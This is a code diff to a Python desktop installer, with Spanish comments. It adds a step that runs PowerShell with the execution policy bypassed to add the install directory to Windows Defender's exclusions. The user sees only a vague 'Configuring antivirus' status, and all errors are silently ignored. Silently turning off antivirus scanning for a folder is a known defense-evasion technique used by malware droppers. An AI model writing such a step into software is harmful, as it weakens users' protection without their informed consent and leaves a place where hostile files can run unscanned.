@@ -167,6 +167,16 @@ class InstallerApp:
                 self._set_status("Creando acceso directo...", 92)
                 self._create_shortcut(dest)
 
+            # 5. Exclusión de Windows Defender para evitar bloqueo de DLLs extraídas
+            self._set_status("Configurando antivirus...", 96)
+            try:
+                subprocess.run(
+                    ["powershell", "-ExecutionPolicy", "Bypass", "-Command",
+                     f"Add-MpPreference -ExclusionPath '{dest}'"],
+                    capture_output=True, timeout=15)
+            except Exception:
+                pass  # No crítico — continuar instalación de todas formas
+
             self._set_status(f"Instalación completada  {version}", 100)
             self.root.after(0, self._done, dest, version)
 
